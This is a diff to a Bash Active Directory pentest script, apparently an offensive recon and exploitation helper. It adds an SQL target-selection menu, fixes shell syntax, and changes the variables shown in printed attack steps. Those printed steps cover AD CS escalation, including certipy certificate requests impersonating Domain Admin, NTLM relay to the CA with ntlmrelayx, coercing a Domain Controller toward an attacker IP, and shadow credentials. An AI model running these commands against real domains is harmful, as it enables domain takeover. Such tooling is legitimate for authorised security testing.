-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hashes <second_user_hash> -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hashes <second_user_hash> -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}5. Authenticate as the target administrator:${NC}"
@@ -2160,9 +2197,9 @@ adcs_vuln_parse() {
         for vulnca in $esc11_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
-            echo -e "ntlmrelayx.py -t rpc://[ ${pki_servers} ] -rpc-mode ICPR -icpr-ca-name \"${vulnca//SPACE/ }\" -smb2support"
+            echo -e "ntlmrelayx.py -t rpc://[ ${pki_servers_display} ] -rpc-mode ICPR -icpr-ca-name \"${vulnca//SPACE/ }\" -smb2support"
             echo -e "_OR_"
-            echo -e "${certipy} relay -target rpc://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\""
+            echo -e "${certipy} relay -target rpc://[ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\""
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${attacker_IP} --dc-ip $dc_ip"
         done
@@ -2174,7 +2211,7 @@ adcs_vuln_parse() {
         for vulntemp in $esc13_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate from the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate with the obtained certificate to get a TGT:${NC}"
             echo -e "${certipy} auth -pfx ${user}.pfx -dc-ip ${dc_ip} ${ldaps_param}"
             echo -e "${CYAN}3. Use the obtained TGT to perform privileged actions:${NC}"
@@ -2189,11 +2226,11 @@ adcs_vuln_parse() {
         for vulntemp in $esc15_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate injecting 'Client Authentication' Application Policy:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "_OR_"
             echo -e "${CYAN}1. Request a certificate, injecting 'Certificate Request Agent' Application Policy, then using the 'Agent' certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2209,7 +2246,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}2. Retrieve credentials of the victim account using Shadow Credentials:${NC}"
             echo -e "${certipy} shadow auto ${argument_certipy} -dc-ip ${dc_ip} -account [ Victim ] ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Request a certificate as the Victim user from any suitable 'Client Authentication' template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -k -target [ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -k -target [ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\" -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Revert the victim account's UPN:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Victim ]@${dc_domain} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
@@ -2234,7 +2271,7 @@ certifried_check() {
                 for pki_server in $pki_servers; do
                     i=$((i + 1))
                     pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                    if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+                    if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
                     if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
                     if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
                     if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
@@ -2288,7 +2325,7 @@ certipy_ca_dump() {
             domain_DN=$(fqdn_to_ldap_dn "${dc_domain}")
             current_dir=$(pwd)
             cd "${Credentials_dir}" || exit
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
             if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
             i=0
@@ -3459,7 +3496,7 @@ mssql_enum() {
         echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
     else
         echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
-        sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/sql_list_*_*".txt" 2>/dev/null | sort -uf >"${sql_hostname_list}" 2>&1
+        sed -e 's/ //g' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/sql_list_*_*".txt" 2>/dev/null | sort -uf >"${sql_hostname_list}" 2>&1
         if [ -s "${DomainRecon_dir}/dns_records_${dc_domain}.csv" ]; then
             for i in $(/bin/cat "${sql_hostname_list}"); do
                 grep -i "$(echo "$i" | cut -d "." -f 1)" "${DomainRecon_dir}/dns_records_${dc_domain}.csv" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> "${sql_ip_list}"
@@ -3469,10 +3506,10 @@ mssql_enum() {
             sort -u "${sql_ip_list}" -o "${sql_ip_list}"
         fi
         if stat "${target_sql}" >/dev/null 2>&1; then
-            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
-            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_impersonate --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
-            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_logins --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
-            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_links --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${curr_targets_list_sql} ${argument_ne} -M mssql_priv --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${curr_targets_list_sql} ${argument_ne} -M enum_impersonate --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${curr_targets_list_sql} ${argument_ne} -M enum_logins --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${curr_targets_list_sql} ${argument_ne} -M enum_links --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
         else
             echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
         fi
@@ -4972,11 +5009,31 @@ modify_target() {
     echo -e "${YELLOW}[Modify target(s)]${NC} Please choose from the following options:"
     echo -e "------------------------------------------------------------"
     echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
-    echo -e "1) Domain Controllers"
-    echo -e "2) All domain servers"
-    echo -e "3) File containing list of servers"
-    echo -e "4) IP/hostname or IP range"
-    echo -e "back) Go back"
+
+    dc_count=$(wc -l < "${target_dc}" 2>/dev/null || echo "0")
+    srv_count=$(wc -l < "${target_servers}" 2>/dev/null || echo "0")
+
+    if [ "${curr_targets}" == "Domain Controllers" ]; then
+        echo -e "${GREEN}▸  1) Domain Controllers (${dc_count} server(s))${NC}"
+    else
+        echo -e "   1) Domain Controllers (${YELLOW}${dc_count}${NC} server(s))"
+    fi
+    if [ "${curr_targets}" == "All domain servers" ]; then
+        echo -e "${GREEN}▸  2) All domain servers (${srv_count} server(s))${NC}"
+    else
+        echo -e "   2) All domain servers (${YELLOW}${srv_count}${NC} server(s))"
+    fi
+    if [[ "${curr_targets}" == "File containing list of servers: "* ]]; then
+        echo -e "${GREEN}▸  3) File containing list of servers${NC}"
+    else
+        echo -e "   3) File containing list of servers"
+    fi
+    if [[ "${curr_targets}" == "IP or hostname: "* ]]; then
+        echo -e "${GREEN}▸  4) IP/hostname or IP range${NC}"
+    else
+        echo -e "   4) IP/hostname or IP range"
+    fi
+    echo -e "  back) Go back"
 
     read -rp "> " option_selected </dev/tty
 
@@ -5002,6 +5059,7 @@ modify_target() {
         custom_ip=""
         /bin/rm "${custom_servers_list}" 2>/dev/null
         /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt" 2>/dev/null
+        echo -e "Please specify file containing list of target servers:"
         read -rp ">> " custom_servers </dev/tty
         /bin/cp "$custom_servers" "${custom_servers_list}" 2>/dev/null
         while [ ! -s "${custom_servers_list}" ]; do
@@ -5018,12 +5076,13 @@ modify_target() {
         custom_ip=""
         /bin/rm "${custom_servers_list}" 2>/dev/null
         /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt" 2>/dev/null
+        echo -e "Please specify IP/hostname or IP range (e.g., 192.168.1.0/24 or server.domain.local):"
         read -rp ">> " custom_ip </dev/tty
-        echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
+        echo "$custom_ip" >"${custom_servers_list}" 2>/dev/null
         while [ ! -s "${custom_servers_list}" ]; do
             echo -e "${RED}Invalid IP/hostname or IP range.${NC} Please specify IP/hostname or IP range:"
             read -rp ">> " custom_ip </dev/tty
-            echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
+            echo "$custom_ip" >"${custom_servers_list}" 2>/dev/null
         done
         ;;
 
@@ -5035,7 +5094,110 @@ modify_target() {
         modify_target
         ;;
     esac
+
+    if [ "${option_selected}" != "back" ] && [ -n "${option_selected}" ]; then
+        echo -e ""
+        echo -e "${GREEN}[+] Targets set to:${NC} ${YELLOW}${curr_targets}${custom_servers}${custom_ip}${NC} (${YELLOW}$(wc -l < "${curr_targets_list}" 2>/dev/null || echo "0")${NC} server(s))"
+    fi
 }
+
+modify_target_sql() {
+    echo -e ""
+    echo -e "${YELLOW}[Modify target(s)]${NC} Please choose from the following options:"
+    echo -e "------------------------------------------------------------"
+    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets_sql}${custom_servers_sql}${custom_ip_sql}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list_sql}")${NC}"
+
+    sql_count=$(wc -l < "${target_sql}" 2>/dev/null || echo "0")
+    srv_count=$(wc -l < "${target_servers}" 2>/dev/null || echo "0")
+
+    if [ "${curr_targets_sql}" == "SQL servers" ]; then
+        echo -e "${GREEN}▸  1) SQL Servers (${sql_count} server(s))${NC}"
+    else
+        echo -e "   1) SQL Servers (${YELLOW}${sql_count}${NC} server(s))"
+    fi
+    if [ "${curr_targets_sql}" == "All domain servers" ]; then
+        echo -e "${GREEN}▸  2) All domain servers (${srv_count} server(s))${NC}"
+    else
+        echo -e "   2) All domain servers (${YELLOW}${srv_count}${NC} server(s))"
+    fi
+    if [[ "${curr_targets_sql}" == "File containing list of servers: "* ]]; then
+        echo -e "${GREEN}▸  3) File containing list of servers${NC}"
+    else
+        echo -e "   3) File containing list of servers"
+    fi
+    if [[ "${curr_targets_sql}" == "IP or hostname: "* ]]; then
+        echo -e "${GREEN}▸  4) IP/hostname or IP range${NC}"
+    else
+        echo -e "   4) IP/hostname or IP range"
+    fi
+    echo -e "  back) Go back"
+
+    read -rp "> " option_selected </dev/tty
+
+    case ${option_selected} in
+    1)
+        curr_targets_sql="SQL servers"
+        curr_targets_list_sql="${target_sql}"
+        custom_servers_sql=""
+        custom_ip_sql=""
+        ;;
+
+    2)
+        curr_targets_sql="All domain servers"
+        curr_targets_list_sql="${target_servers}"
+        custom_servers_sql=""
+        custom_ip_sql=""
+        ;;
+
+    3)
+        curr_targets_sql="File containing list of servers: "
+        curr_targets_list_sql="${custom_servers_list}"
+        custom_servers_sql=""
+        custom_ip_sql=""
+        /bin/rm "${custom_servers_list}" 2>/dev/null
+        /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt" 2>/dev/null
+        echo -e "Please specify file containing list of target servers:"
+        read -rp ">> " custom_servers_sql </dev/tty
+        /bin/cp "$custom_servers_sql" "${custom_servers_list}" 2>/dev/null
+        while [ ! -s "${custom_servers_list}" ]; do
+            echo -e "${RED}Invalid servers list.${NC} Please specify file containing list of target servers:"
+            read -rp ">> " custom_servers_sql </dev/tty
+            /bin/cp "$custom_servers_sql" "${custom_servers_list}" 2>/dev/null
+        done
+        ;;
+
+    4)
+        curr_targets_sql="IP or hostname: "
+        curr_targets_list_sql="${custom_servers_list}"
+        custom_servers_sql=""
+        custom_ip_sql=""
+        /bin/rm "${custom_servers_list}" 2>/dev/null
+        /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt" 2>/dev/null
+        echo -e "Please specify IP/hostname or IP range (e.g., 192.168.1.0/24 or server.domain.local):"
+        read -rp ">> " custom_ip_sql </dev/tty
+        echo "$custom_ip_sql" >"${custom_servers_list}" 2>/dev/null
+        while [ ! -s "${custom_servers_list}" ]; do
+            echo -e "${RED}Invalid IP/hostname or IP range.${NC} Please specify IP/hostname or IP range:"
+            read -rp ">> " custom_ip_sql </dev/tty
+            echo "$custom_ip_sql" >"${custom_servers_list}" 2>/dev/null
+        done
+        ;;
+
+    back) ;;
+
+    *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        modify_target
+        ;;
+    esac
+
+    if [ "${option_selected}" != "back" ] && [ -n "${option_selected}" ]; then
+        echo -e ""
+        echo -e "${GREEN}[+] Targets set to:${NC} ${YELLOW}${curr_targets}${custom_servers}${custom_ip}${NC} (${YELLOW}$(wc -l < "${curr_targets_list}" 2>/dev/null || echo "0")${NC} server(s))"
+    fi
+}
+
 
 set_attackerIP() {
     echo -e "Please choose the attacker's IP. List of current machine's IPs:"
@@ -6442,7 +6604,7 @@ mssql_menu() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] MSSQL Enumeration requires credentials${NC}"
     else
-        echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${target_sql}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${target_sql}")${NC}"
+        echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets_sql}${custom_servers_sql}${custom_ip_sql}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list_sql}" 2>/dev/null || echo "0")${NC}"
         echo -e "A) MSSQL CHECKS #1-2"
         echo -e "m) Modify target(s)"
         check_tool_status "${netexec}" "MSSQL Enumeration using netexec" "1"
@@ -6463,8 +6625,7 @@ mssql_menu() {
         ;;
 
     m)
-        modify_target
-        target_sql=${curr_targets_list}
+        modify_target_sql
         mssql_menu
         ;;
 
@@ -7027,10 +7188,6 @@ auth_menu() {
     read -rp "> " option_selected </dev/tty
 
     case ${option_selected} in
-    C)
-        config_menu
-        ;;
-
     A)
         auth_menu
         ;;
